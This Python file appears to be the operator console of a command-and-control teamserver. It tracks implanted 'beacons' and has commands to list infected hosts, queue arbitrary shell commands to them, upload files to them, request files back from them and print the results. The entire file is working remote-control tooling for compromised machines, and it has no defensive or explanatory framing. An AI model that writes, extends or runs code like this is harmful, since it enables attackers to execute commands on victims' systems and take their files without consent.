import os
import uuid
import base64

BEACONS = {}
RESULTS = {}
TASKS = {}

def init(beacons, results, tasks):
    global BEACONS, RESULTS, TASKS
    BEACONS = beacons
    RESULTS = results
    TASKS = tasks

def help_menu():
    print("""
Available Commands:
    help                            Show this help menu
    beacons                         List active beacons
    task <command>                  Assign a shell command to a beacon
    upload <file> <output>          Upload file to beacon
    download <file>                 Request beacon to send back file
    results                         Show all task results
    exit                            Quit the teamserver
""")

def execute(cmd):
    tokens = cmd.strip().split()
    if not tokens:
        return

    if tokens[0] == "help":
        help_menu()

    elif tokens[0] == "beacons":
        for bid, data in BEACONS.items():
            print(f"ID: {bid} | Host: {data['info'].get('hostname')} | IP: {data['info'].get('ip')}")

    elif tokens[0] == "task" and len(tokens) >= 3:
        beacon_id = tokens[1]
        command = " ".join(tokens[2:])
        if beacon_id in BEACONS:
            task_id = str(uuid.uuid4())
            task = {"task_id": task_id, "type": "cmd", "command": command}
            BEACONS[beacon_id]["tasks"].append(task)
            TASKS[task_id] = task
            print(f"[+] Task queued to {beacon_id}")
        else:
            print("[-] Beacon not found.")

    elif tokens[0] == "upload" and len(tokens) == 4:
        beacon_id, src_path, dst_path = tokens[1], tokens[2], tokens[3]
        if beacon_id not in BEACONS:
            print("[-] Beacon not found.")
            return
        if not os.path.isfile(src_path):
            print("[-] Source file not found.")
            return

        try:
            with open(src_path, "rb") as f:
                file_data = f.read()
                encoded = base64.b64encode(file_data).decode()

            task_id = str(uuid.uuid4())
            task = {
                "task_id": task_id,
                "type": "upload",
                "dst": dst_path,
                "data": encoded
            }
            BEACONS[beacon_id]["tasks"].append(task)
            TASKS[task_id] = task
            print(f"[+] Upload task queued to {beacon_id}")

            # Save uploaded file locally on the teamserver
            upload_dir = "uploads"
            os.makedirs(upload_dir, exist_ok=True)
            filename = os.path.basename(src_path)
            save_path = os.path.join(upload_dir, f"{beacon_id}_{filename}")

            with open(save_path, "wb") as f:
                f.write(file_data)
            print(f"[+] Uploaded file saved on server as: {save_path}")

        except Exception as e:
            print(f"[-] Upload failed: {e}")

    elif tokens[0] == "download" and len(tokens) == 3:
        beacon_id, path = tokens[1], tokens[2]
        if beacon_id not in BEACONS:
            print("[-] Beacon not found.")
            return

        task_id = str(uuid.uuid4())
        task = {
            "task_id": task_id,
            "type": "download",
            "path": path
        }
        BEACONS[beacon_id]["tasks"].append(task)
        TASKS[task_id] = task
        print(f"[+] Download task queued to {beacon_id}")

    elif tokens[0] == "results":
        for tid, output in RESULTS.items():
            print(f"\nTask ID: {tid}\nResult:\n{output}")

    elif tokens[0] == "exit":
        print("[*] Shutting down...")
        exit(0)

    else:
        print("[-] Unknown command. Type 'help' for options.")

